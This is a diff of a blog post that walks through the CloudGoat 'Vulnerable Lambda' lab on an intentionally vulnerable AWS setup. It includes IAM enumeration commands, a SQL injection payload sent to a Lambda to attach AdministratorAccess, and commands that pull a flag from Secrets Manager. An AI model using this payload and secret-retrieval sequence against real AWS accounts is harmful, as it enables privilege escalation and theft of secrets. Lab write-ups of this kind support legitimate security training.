@@ -1,7 +1,7 @@
 ---
 title:  "CloudGoat Vulnerable Lambda Scenario - Part 1 (Attack)"
 description: 
-date: 2023-02-07 22:06:49-05:00
+date: 2023-02-20 23:52:49-05:00
 categories: [Cloud, AWS] 
 tags: [aws, cloud, lab, walkthrough]
 toc: true
@@ -51,7 +51,8 @@ before following along.
 
 Avoid dependency conflicts by isolating them on a per-project basis with `venv` 
 or something similar (e.g., [pyenv](https://github.com/pyenv/pyenv)). Once the 
-venv is created, drop into the environment and install CloudGoat's dependencies:  
+virtual environment is created, drop into the environment and install 
+CloudGoat's dependencies:  
 
 ```bash
 git clone https://github.com/RhinoSecurityLabs/cloudgoat.git
@@ -67,19 +68,21 @@ python -m pip install -r requirements.txt
 When using the AWS CLI, I prefer to leverage [`aws-vault`](https://github.com/99designs/aws-vault)
 to manage credentials. Ultimately, `aws-vault` uses the OS secure keystore to 
 lock down access to these credentials and makes the necessary AWS STS API calls 
-to generate temporary credentials for access. This abides by best practice, as
-the credentials are not hard-coded on disk in plaintext.
+to generate temporary credentials for access. This approach prevents AWS 
+credentials from being stored in plaintext on the local filesystem.
 
 ~~In an ideal world, there would be a programmatic way to craft an IAM policy for this Terraform role, but I haven't discovered one that is officially supported and simple to use (e.g., anything that's not running `terraform apply` and playing whack-a-mole with AWS API error messages).~~
 
 [Ian McKay](https://twitter.com/iann0036) to the rescue! We can utilize [iamlive](https://github.com/iann0036/iamlive) 
 to dynamically build an IAM policy for the Terraform role that strictly 
-abides by the principle of least privilege. [This blog post](https://meirg.co.il/2021/04/23/determining-aws-iam-policies-according-to-terraform-and-aws-cli/) covers the process
-of setting up `iamlive` as a Docker container, configuring the appropriate 
-environment variables to pass HTTP/HTTPS traffic to its proxy, and collect the
-generated IAM policy for use. Unfortunately, executing `cloudgoat.py` and 
-passing its AWS API calls to `iamlive` requires a bit of tinkering. Luckily for
-you, I've provided the IAM policy we're after below:  
+abides by the principle of least privilege. [This blog post](https://meirg.co.il/2021/04/23/determining-aws-iam-policies-according-to-terraform-and-aws-cli/) 
+covers the process of setting up `iamlive` as a Docker container, configuring 
+the appropriate environment variables to pass HTTP/HTTPS traffic to its proxy, 
+and collect the generated IAM policy for use. In order to generate the 
+appropriate IAM policy for each CloudGoat scenario, you'll need to copy the 
+`terraform` directory to a new directory and following the steps outlined by the
+referenced blog post. Alternatively, the IAM policy we're after below can be 
+found below!   
 
 ```json
 {
@@ -106,10 +109,12 @@ you, I've provided the IAM policy we're after below:
                 "iam:ListRolePolicies",
                 "iam:GetRolePolicy",
                 "iam:ListAttachedRolePolicies",
+                "iam:ListAttachedUserPolicies",
                 "iam:PassRole",
                 "iam:GetUserPolicy",
                 "iam:ListAccessKeys",
                 "iam:DeleteUserPolicy",
+                "iam:DetachUserPolicy",
                 "iam:ListInstanceProfilesForRole",
                 "iam:DeleteAccessKey",
                 "iam:DeleteRolePolicy",
@@ -422,16 +427,16 @@ code. This can be found in the `Code.Location` attribute when calling
 `lambda:GetFunction`.
 
 ```bash
-aws lambda get-function --function-name vulnerable_lambda_cgid774pjcgkoe-policy_applier_lambda1
+aws lambda get-function --function-name vulnerable_lambda_cgidlbywef16bt-policy_applier_lambda1
 ```
 
 ```json
 {
     "Configuration": {
-        "FunctionName": "vulnerable_lambda_cgid774pjcgkoe-policy_applier_lambda1",
-        "FunctionArn": "arn:aws:lambda:us-east-1:REDACTED:function:vulnerable_lambda_cgid774pjcgkoe-policy_applier_lambda1",
+        "FunctionName": "vulnerable_lambda_cgidlbywef16bt-policy_applier_lambda1",
+        "FunctionArn": "arn:aws:lambda:us-east-1:REDACTED:function:vulnerable_lambda_cgidlbywef16bt-policy_applier_lambda1",
         "Runtime": "python3.9",
-        "Role": "arn:aws:iam::REDACTED:role/vulnerable_lambda_cgid774pjcgkoe-policy_applier_lambda1",
+        "Role": "arn:aws:iam::REDACTED:role/vulnerable_lambda_cgidlbywef16bt-policy_applier_lambda1",
         "Handler": "main.handler",
         "CodeSize": 991559,
         "Description": "This function will apply a managed policy to the user of your choice, so long as the database says that it's okay...",
@@ -459,7 +464,7 @@ aws lambda get-function --function-name vulnerable_lambda_cgid774pjcgkoe-policy_
         "Location": "https://REDACTED"
     },
     "Tags": {
-        "Name": "cg-vulnerable_lambda_cgid774pjcgkoe",
+        "Name": "cg-vulnerable_lambda_cgidlbywef16bt",
         "Scenario": "vulnerable-lambda",
         "Stack": "CloudGoat"
     }
@@ -571,7 +576,7 @@ statement = f"select policy_name from policies where policy_name='{policy}' and 
 ```
 
 ```bash
-aws lambda invoke --function-name vulnerable_lambda_cgidgfmjd1k7yo-policy_applier_lambda1 --payload '{"policy_names":["AdministratorAccess'\''; --"],"user_name":"cg-bilbo-vulnerable_lambda_cgidgfmjd1k7yo"}' --cli-binary-format raw-in-base64-out response.json --region us-east-1
+aws lambda invoke --function-name vulnerable_lambda_cgidlbywef16bt-policy_applier_lambda1 --payload '{"policy_names":["AdministratorAccess'\''; --"],"user_name":"cg-bilbo-vulnerable_lambda_cgidlbywef16bt"}' --cli-binary-format raw-in-base64-out response.json --region us-east-1
 ```
 
 ```json
@@ -593,7 +598,7 @@ IAM user for additional policies (beyond the inline user policy created
 alongside the user):  
 
 ```bash
-aws iam list-attached-user-policies --user-name cg-bilbo-vulnerable_lambda_cgidgfmjd1k7yo
+aws iam list-attached-user-policies --user-name cg-bilbo-vulnerable_lambda_cgidlbywef16bt
 {
     "AttachedPolicies": [
         {
@@ -607,7 +612,7 @@ aws iam list-attached-user-policies --user-name cg-bilbo-vulnerable_lambda_cgidg
 ## Post-Exploitation
 
 Now that we have full admin access, we can persist, move laterally, pillage 
-secrets and source code, basically anything. Listing secrets in Secrets Manager 
+secrets and source code, etc. Listing secrets in Secrets Manager 
 will retrieve the scenario's flag.
 
 ```bash
@@ -618,8 +623,8 @@ aws secretsmanager list-secrets
 {
     "SecretList": [
         {
-            "ARN": "arn:aws:secretsmanager:us-east-1:REDACTED:secret:vulnerable_lambda_cgid774pjcgkoe-final_flag-quMGQi",
-            "Name": "vulnerable_lambda_cgid774pjcgkoe-final_flag",
+            "ARN": "arn:aws:secretsmanager:us-east-1:REDACTED:secret:vulnerable_lambda_cgidlbywef16bt-final_flag-quMGQi",
+            "Name": "vulnerable_lambda_cgidlbywef16bt-final_flag",
             "LastChangedDate": "2023-02-19T14:11:26.843000-05:00",
             "LastAccessedDate": "2023-02-18T19:00:00-05:00",
             "Tags": [
@@ -629,7 +634,7 @@ aws secretsmanager list-secrets
                 },
                 {
                     "Key": "Name",
-                    "Value": "cg-vulnerable_lambda_cgid774pjcgkoe"
+                    "Value": "cg-vulnerable_lambda_cgidlbywef16bt"
                 },
                 {
                     "Key": "Scenario",
@@ -648,13 +653,13 @@ aws secretsmanager list-secrets
 ```
 
 ```bash
-aws secretsmanager get-secret-value --secret-id vulnerable_lambda_cgid774pjcgkoe-final_flag  
+aws secretsmanager get-secret-value --secret-id vulnerable_lambda_cgidlbywef16bt-final_flag  
 ```
 
 ```json
 {
-    "ARN": "arn:aws:secretsmanager:us-east-1:REDACTED:secret:vulnerable_lambda_cgid774pjcgkoe-final_flag-quMGQi",
-    "Name": "vulnerable_lambda_cgid774pjcgkoe-final_flag",
+    "ARN": "arn:aws:secretsmanager:us-east-1:REDACTED:secret:vulnerable_lambda_cgidlbywef16bt-final_flag-quMGQi",
+    "Name": "vulnerable_lambda_cgidlbywef16bt-final_flag",
     "VersionId": "183B5F61-1B84-4465-BDCD-13CE9953ECC2",
     "SecretString": "cg-secret-846237-284529",
     "VersionStages": [
@@ -674,18 +679,18 @@ we'll repeat the entire exercise using cloudfox.
 What IAM permissions are attached to this IAM user?
 
 ```bash
-cloudfox aws permissions --principal arn:aws:iam::REDACTED:user/cg-bilbo-vulnerable_lambda_cgid73or123swp -o csv     
+cloudfox aws permissions --principal arn:aws:iam::REDACTED:user/cg-bilbo-vulnerable_lambda_cgidlbywef16bt -o csv     
 ```
 
 |Service|Principal Type|Name                                     |Policy Type|Policy Name                                                    |Effect|Action                     |Resource                                         |
 |-------|--------------|-----------------------------------------|-----------|---------------------------------------------------------------|------|---------------------------|-------------------------------------------------|
-|IAM    |User          |cg-bilbo-vulnerable_lambda_cgid73or123swp|Inline     |cg-bilbo-vulnerable_lambda_cgid73or123swp-standard-user-assumer|Allow |sts:AssumeRole             |arn:aws:iam::REDACTED:role/cg-lambda-invoker*|
-|IAM    |User          |cg-bilbo-vulnerable_lambda_cgid73or123swp|Inline     |cg-bilbo-vulnerable_lambda_cgid73or123swp-standard-user-assumer|Allow |iam:Get*                   |*                                                |
-|IAM    |User          |cg-bilbo-vulnerable_lambda_cgid73or123swp|Inline     |cg-bilbo-vulnerable_lambda_cgid73or123swp-standard-user-assumer|Allow |iam:List*                  |*                                                |
-|IAM    |User          |cg-bilbo-vulnerable_lambda_cgid73or123swp|Inline     |cg-bilbo-vulnerable_lambda_cgid73or123swp-standard-user-assumer|Allow |iam:SimulateCustomPolicy   |*                                                |
-|IAM    |User          |cg-bilbo-vulnerable_lambda_cgid73or123swp|Inline     |cg-bilbo-vulnerable_lambda_cgid73or123swp-standard-user-assumer|Allow |iam:SimulatePrincipalPolicy|*                                                |
+|IAM    |User          |cg-bilbo-vulnerable_lambda_cgidlbywef16bt|Inline     |cg-bilbo-vulnerable_lambda_cgidlbywef16bt-standard-user-assumer|Allow |sts:AssumeRole             |arn:aws:iam::REDACTED:role/cg-lambda-invoker*|
+|IAM    |User          |cg-bilbo-vulnerable_lambda_cgidlbywef16bt|Inline     |cg-bilbo-vulnerable_lambda_cgidlbywef16bt-standard-user-assumer|Allow |iam:Get*                   |*                                                |
+|IAM    |User          |cg-bilbo-vulnerable_lambda_cgidlbywef16bt|Inline     |cg-bilbo-vulnerable_lambda_cgidlbywef16bt-standard-user-assumer|Allow |iam:List*                  |*                                                |
+|IAM    |User          |cg-bilbo-vulnerable_lambda_cgidlbywef16bt|Inline     |cg-bilbo-vulnerable_lambda_cgidlbywef16bt-standard-user-assumer|Allow |iam:SimulateCustomPolicy   |*                                                |
+|IAM    |User          |cg-bilbo-vulnerable_lambda_cgidlbywef16bt|Inline     |cg-bilbo-vulnerable_lambda_cgidlbywef16bt-standard-user-assumer|Allow |iam:SimulatePrincipalPolicy|*                                                |
 
-What are the cg-lambda-invoker roles?
+Show me all IAM roles prefixed with "cg-lambda-invoker":  
 
 ```bash
 cloudfox aws principals -o csv
@@ -693,33 +698,34 @@ cloudfox aws principals -o csv
 
 | Service | Type | Name | Arn |
 |-------|------|-----------|-----|
-| IAM | Role | cg-lambda-invoker-vulnerable_lambda_cgid73or123swp | arn:aws:iam::REDACTED:role/cg-lambda-invoker-vulnerable_lambda_cgid73or123swp |
+| IAM | Role | cg-lambda-invoker-vulnerable_lambda_cgidlbywef16bt | arn:aws:iam::REDACTED:role/cg-lambda-invoker-vulnerable_lambda_cgidlbywef16bt |
 
-What permissions does the cg-lambda-invoker role have?
+What permissions does the "cg-lambda-invoker" role have?
 
 ```bash
-cloudfox aws permissions --principal arn:aws:iam::REDACTED:role/cg-lambda-invoker-vulnerable_lambda_cgid73or123swp -o csv
+cloudfox aws permissions --principal arn:aws:iam::REDACTED:role/cg-lambda-invoker-vulnerable_lambda_cgidlbywef16bt -o csv
 ```
 
 | Service | Principal Type | Name | Policy Type | Policy Name | Effect | Action | Resource |
 |---------|----------------|------|-------------|-------------|--------|--------|----------|
-| IAM | Role | cg-lambda-invoker-vulnerable_lambda_cgid73or123swp | Inline | lambda-invoker | Allow | lambda:ListFunctionEventInvokeConfigs | arn:aws:lambda:us-east-1:REDACTED:function:vulnerable_lambda_cgid73or123swp-policy_applier_lambda1 |
-| IAM | Role | cg-lambda-invoker-vulnerable_lambda_cgid73or123swp | Inline | lambda-invoker | Allow | lambda:ListFunctionEventInvokeConfigs | arn:aws:lambda:us-east-1:REDACTED:function:vulnerable_lambda_cgid73or123swp-policy_applier_lambda1 |
-| IAM | Role | cg-lambda-invoker-vulnerable_lambda_cgid73or123swp | Inline | lambda-invoker | Allow | lambda:InvokeFunction | arn:aws:lambda:us-east-1:REDACTED:function:vulnerable_lambda_cgid73or123swp-policy_applier_lambda1 |
-| IAM | Role | cg-lambda-invoker-vulnerable_lambda_cgid73or123swp | Inline | lambda-invoker | Allow | lambda:InvokeFunction | arn:aws:lambda:us-east-1:REDACTED:function:vulnerable_lambda_cgid73or123swp-policy_applier_lambda1 |
-| IAM | Role | cg-lambda-invoker-vulnerable_lambda_cgid73or123swp | Inline | lambda-invoker | Allow | lambda:ListTags | arn:aws:lambda:us-east-1:REDACTED:function:vulnerable_lambda_cgid73or123swp-policy_applier_lambda1 |
-| IAM | Role | cg-lambda-invoker-vulnerable_lambda_cgid73or123swp | Inline | lambda-invoker | Allow | lambda:ListTags | arn:aws:lambda:us-east-1:REDACTED:function:vulnerable_lambda_cgid73or123swp-policy_applier_lambda1 |
-| IAM | Role | cg-lambda-invoker-vulnerable_lambda_cgid73or123swp | Inline | lambda-invoker | Allow | lambda:GetFunction | arn:aws:lambda:us-east-1:REDACTED:function:vulnerable_lambda_cgid73or123swp-policy_applier_lambda1 |
-| IAM | Role | cg-lambda-invoker-vulnerable_lambda_cgid73or123swp | Inline | lambda-invoker | Allow | lambda:GetFunction | arn:aws:lambda:us-east-1:REDACTED:function:vulnerable_lambda_cgid73or123swp-policy_applier_lambda1 |
-| IAM | Role | cg-lambda-invoker-vulnerable_lambda_cgid73or123swp | Inline | lambda-invoker | Allow | lambda:GetPolicy | arn:aws:lambda:us-east-1:REDACTED:function:vulnerable_lambda_cgid73or123swp-policy_applier_lambda1 |
-| IAM | Role | cg-lambda-invoker-vulnerable_lambda_cgid73or123swp | Inline | lambda-invoker | Allow | lambda:GetPolicy | arn:aws:lambda:us-east-1:REDACTED:function:vulnerable_lambda_cgid73or123swp-policy_applier_lambda1 |
-| IAM | Role | cg-lambda-invoker-vulnerable_lambda_cgid73or123swp | Inline | lambda-invoker | Allow | lambda:ListFunctions | * |
-| IAM | Role | cg-lambda-invoker-vulnerable_lambda_cgid73or123swp | Inline | lambda-invoker | Allow | iam:Get* | * |
-| IAM | Role | cg-lambda-invoker-vulnerable_lambda_cgid73or123swp | Inline | lambda-invoker | Allow | iam:List* | * |
-| IAM | Role | cg-lambda-invoker-vulnerable_lambda_cgid73or123swp | Inline | lambda-invoker | Allow | iam:SimulateCustomPolicy | * |
-| IAM | Role | cg-lambda-invoker-vulnerable_lambda_cgid73or123swp | Inline | lambda-invoker | Allow | iam:SimulatePrincipalPolicy | * |
+| IAM | Role | cg-lambda-invoker-vulnerable_lambda_cgidlbywef16bt | Inline | lambda-invoker | Allow | lambda:ListFunctionEventInvokeConfigs | arn:aws:lambda:us-east-1:REDACTED:function:vulnerable_lambda_cgidlbywef16bt-policy_applier_lambda1 |
+| IAM | Role | cg-lambda-invoker-vulnerable_lambda_cgidlbywef16bt | Inline | lambda-invoker | Allow | lambda:ListFunctionEventInvokeConfigs | arn:aws:lambda:us-east-1:REDACTED:function:vulnerable_lambda_cgidlbywef16bt-policy_applier_lambda1 |
+| IAM | Role | cg-lambda-invoker-vulnerable_lambda_cgidlbywef16bt | Inline | lambda-invoker | Allow | lambda:InvokeFunction | arn:aws:lambda:us-east-1:REDACTED:function:vulnerable_lambda_cgidlbywef16bt-policy_applier_lambda1 |
+| IAM | Role | cg-lambda-invoker-vulnerable_lambda_cgidlbywef16bt | Inline | lambda-invoker | Allow | lambda:InvokeFunction | arn:aws:lambda:us-east-1:REDACTED:function:vulnerable_lambda_cgidlbywef16bt-policy_applier_lambda1 |
+| IAM | Role | cg-lambda-invoker-vulnerable_lambda_cgidlbywef16bt | Inline | lambda-invoker | Allow | lambda:ListTags | arn:aws:lambda:us-east-1:REDACTED:function:vulnerable_lambda_cgidlbywef16bt-policy_applier_lambda1 |
+| IAM | Role | cg-lambda-invoker-vulnerable_lambda_cgidlbywef16bt | Inline | lambda-invoker | Allow | lambda:ListTags | arn:aws:lambda:us-east-1:REDACTED:function:vulnerable_lambda_cgidlbywef16bt-policy_applier_lambda1 |
+| IAM | Role | cg-lambda-invoker-vulnerable_lambda_cgidlbywef16bt | Inline | lambda-invoker | Allow | lambda:GetFunction | arn:aws:lambda:us-east-1:REDACTED:function:vulnerable_lambda_cgidlbywef16bt-policy_applier_lambda1 |
+| IAM | Role | cg-lambda-invoker-vulnerable_lambda_cgidlbywef16bt | Inline | lambda-invoker | Allow | lambda:GetFunction | arn:aws:lambda:us-east-1:REDACTED:function:vulnerable_lambda_cgidlbywef16bt-policy_applier_lambda1 |
+| IAM | Role | cg-lambda-invoker-vulnerable_lambda_cgidlbywef16bt | Inline | lambda-invoker | Allow | lambda:GetPolicy | arn:aws:lambda:us-east-1:REDACTED:function:vulnerable_lambda_cgidlbywef16bt-policy_applier_lambda1 |
+| IAM | Role | cg-lambda-invoker-vulnerable_lambda_cgidlbywef16bt | Inline | lambda-invoker | Allow | lambda:GetPolicy | arn:aws:lambda:us-east-1:REDACTED:function:vulnerable_lambda_cgidlbywef16bt-policy_applier_lambda1 |
+| IAM | Role | cg-lambda-invoker-vulnerable_lambda_cgidlbywef16bt | Inline | lambda-invoker | Allow | lambda:ListFunctions | * |
+| IAM | Role | cg-lambda-invoker-vulnerable_lambda_cgidlbywef16bt | Inline | lambda-invoker | Allow | iam:Get* | * |
+| IAM | Role | cg-lambda-invoker-vulnerable_lambda_cgidlbywef16bt | Inline | lambda-invoker | Allow | iam:List* | * |
+| IAM | Role | cg-lambda-invoker-vulnerable_lambda_cgidlbywef16bt | Inline | lambda-invoker | Allow | iam:SimulateCustomPolicy | * |
+| IAM | Role | cg-lambda-invoker-vulnerable_lambda_cgidlbywef16bt | Inline | lambda-invoker | Allow | iam:SimulatePrincipalPolicy | * |
 
-Before we jump right to downloading the Lambda function itself, let's gather some more information:
+Before we jump right to downloading the Lambda function itself, let's gather 
+some more information:
 
 ```bash
 cloudfox aws lambda
@@ -727,28 +733,28 @@ cloudfox aws lambda
 
 | Service | Region | Resource Arn | Role | IsAdminRole? |
 |---------|--------|--------------|------|--------------|
-| Lambda| us-east-1 | vulnerable_lambda_cgidr0ub7ivite-policy_applier_lambda1 | arn:aws:iam::REDACTED:role/vulnerable_lambda_cgidr0ub7ivite-policy_applier_lambda1 | No |
+| Lambda| us-east-1 | vulnerable_lambda_cgidlbywef16bt-policy_applier_lambda1 | arn:aws:iam::REDACTED:role/vulnerable_lambda_cgidlbywef16bt-policy_applier_lambda1 | No |
 
-What kind of permissions does this role have?
+What kind of permissions does the IAM role attached to this Lambda function have?
 
 ```bash
-cloudfox aws permissions --principal arn:aws:iam::REDACTED:role/vulnerable_lambda_cgidr0ub7ivite-policy_applier_lambda1
+cloudfox aws permissions --principal arn:aws:iam::REDACTED:role/vulnerable_lambda_cgidlbywef16bt-policy_applier_lambda1
 ```
 
 | Service | Principal Type | Name | Policy Type | Policy Name | Effect | Action | Resource |
 |---------|----------------|------|-------------|-------------|--------|--------|----------|
-| IAM | Role | vulnerable_lambda_cgidr0ub7ivite-policy_applier_lambda1 | Inline | policy_applier_lambda1 | Allow | iam:AttachUserPolicy | arn:aws:iam::REDACTED:user/cg-bilbo-vulnerable_lambda_cgidr0ub7ivite |
-| IAM | Role | vulnerable_lambda_cgidr0ub7ivite-policy_applier_lambda1 | Inline | policy_applier_lambda1 | Allow | s3:GetObject | * |
-| IAM | Role | vulnerable_lambda_cgidr0ub7ivite-policy_applier_lambda1 | Inline | policy_applier_lambda1 | Allow | logs:CreateLogGroup | arn:aws:logs:*:*:* |
-| IAM | Role | vulnerable_lambda_cgidr0ub7ivite-policy_applier_lambda1 | Inline | policy_applier_lambda1 | Allow | logs:CreateLogStream | arn:aws:logs:*:*:log-group:*:* |
-| IAM | Role | vulnerable_lambda_cgidr0ub7ivite-policy_applier_lambda1 | Inline | policy_applier_lambda1 | Allow | logs:PutLogEvents | arn:aws:logs:*:*:log-group:*:* |
+| IAM | Role | vulnerable_lambda_cgidlbywef16bt-policy_applier_lambda1 | Inline | policy_applier_lambda1 | Allow | iam:AttachUserPolicy | arn:aws:iam::REDACTED:user/cg-bilbo-vulnerable_lambda_cgidlbywef16bt |
+| IAM | Role | vulnerable_lambda_cgidlbywef16bt-policy_applier_lambda1 | Inline | policy_applier_lambda1 | Allow | s3:GetObject | * |
+| IAM | Role | vulnerable_lambda_cgidlbywef16bt-policy_applier_lambda1 | Inline | policy_applier_lambda1 | Allow | logs:CreateLogGroup | arn:aws:logs:*:*:* |
+| IAM | Role | vulnerable_lambda_cgidlbywef16bt-policy_applier_lambda1 | Inline | policy_applier_lambda1 | Allow | logs:CreateLogStream | arn:aws:logs:*:*:log-group:*:* |
+| IAM | Role | vulnerable_lambda_cgidlbywef16bt-policy_applier_lambda1 | Inline | policy_applier_lambda1 | Allow | logs:PutLogEvents | arn:aws:logs:*:*:log-group:*:* |
 
 cloudfox was kind enough to print out the AWS CLI commands necessary to download
-the function. We simply need to make some minor tweaks for it to work properly 
-(especially with aws-vault).  
+the function code. We simply need to make some minor tweaks for it to work 
+properly (especially with aws-vault).  
 
 ```bash
-cat cloudfox-output/aws/REDACTED-AROAW43MRFXBYDQUWHENX_1673316979024011106/loot/lambda-get-function-commands.txt
+cat cloudfox-output/aws/REDACTED/loot/lambda-get-function-commands.txt
 #############################################
 # The profile you will use to perform these commands is most likely not the profile you used to run CloudFox
 # Set the $profile environment variable to the profile you are going to use to inspect the buckets.
@@ -756,42 +762,42 @@ cat cloudfox-output/aws/REDACTED-AROAW43MRFXBYDQUWHENX_1673316979024011106/loot/
 #############################################
 
 =============================================
-# Lambda Name: vulnerable_lambda_cgid73or123swp-policy_applier_lambda1
+# Lambda Name: vulnerable_lambda_cgidlbywef16bt-policy_applier_lambda1
 
 # Get function metadata including download location
-aws --profile $profile --region us-east-1 lambda get-function --function-name vulnerable_lambda_cgid73or123swp-policy_applier_lambda1
+aws --profile $profile --region us-east-1 lambda get-function --function-name vulnerable_lambda_cgidlbywef16bt-policy_applier_lambda1
 # Download function code to to disk (requires jq and curl) 
-mkdir -p ./lambdas/vulnerable_lambda_cgid73or123swp-policy_applier_lambda1
-url=`aws --profile $profile lambda get-function --region us-east-1 --function-name vulnerable_lambda_cgid73or123swp-policy_applier_lambda1 | jq .Code.Location | sed s/"//g` && curl "$url" -o ./lambdas/vulnerable_lambda_cgid73or123swp-policy_applier_lambda1.zip
+mkdir -p ./lambdas/vulnerable_lambda_cgidlbywef16bt-policy_applier_lambda1
+url=`aws --profile $profile lambda get-function --region us-east-1 --function-name vulnerable_lambda_cgidlbywef16bt-policy_applier_lambda1 | jq .Code.Location | sed s/"//g` && curl "$url" -o ./lambdas/vulnerable_lambda_cgidlbywef16bt-policy_applier_lambda1.zip
 ```
 
 Exploitation of the SQL injection bug in this Lambda function needs to be done
-manually. Once the AdministratorAccess managed policy has been attache to the 
-bilbo user, we can use the `secrets` cloudfox command to retrieve the flag.
+manually. Once the AdministratorAccess managed policy has been attached to the 
+`bilbo` user, we can use the `secrets` cloudfox command to retrieve the flag.
 
 ```bash
 cloudfox aws secrets                  
 ```
 
 ```bash
-cat cloudfox-output/aws/REDACTED-AIDAW43MRFXB5YQGO4KP4/loot/pull-secrets-commands.txt                           
+cat cloudfox-output/aws/REDACTED/loot/pull-secrets-commands.txt                           
 #############################################
 # The profile you will use to perform these commands is most likely not the profile you used to run CloudFox
 # Set the $profile environment variable to the profile you are going to use to pull the secrets/parameters.
 # E.g., export profile=dev-prod.
 #############################################
 
-aws --profile $profile --region us-east-1 secretsmanager get-secret-value --secret-id vulnerable_lambda_cgid73or123swp-final_flag
+aws --profile $profile --region us-east-1 secretsmanager get-secret-value --secret-id vulnerable_lambda_cgidlbywef16bt-final_flag
 ```
 
 ```bash
-aws --region us-east-1 secretsmanager get-secret-value --secret-id vulnerable_lambda_cgid73or123swp-final_flag
+aws --region us-east-1 secretsmanager get-secret-value --secret-id vulnerable_lambda_cgidlbywef16bt-final_flag
 ```
 
 ```json
 {
-    "ARN": "arn:aws:secretsmanager:us-east-1:REDACTED:secret:vulnerable_lambda_cgid73or123swp-final_flag-Sif8pD",
-    "Name": "vulnerable_lambda_cgid73or123swp-final_flag",
+    "ARN": "arn:aws:secretsmanager:us-east-1:REDACTED:secret:vulnerable_lambda_cgidlbywef16bt-final_flag-Sif8pD",
+    "Name": "vulnerable_lambda_cgidlbywef16bt-final_flag",
     "VersionId": "4388D5FC-A56B-457A-8FF6-0D4CBBFF9CD1",
     "SecretString": "cg-secret-846237-284529",
     "VersionStages": [
@@ -800,5 +806,10 @@ aws --region us-east-1 secretsmanager get-secret-value --secret-id vulnerable_la
     "CreatedDate": "2023-01-09T19:54:47.793000-05:00"
 }
 ```
+
+## How can we detect this?
+
+Part two of this series will cover how we can deploy detections designed to 
+proactively identify this malicious activity.
 
 Happy (hacking\|hunting)!
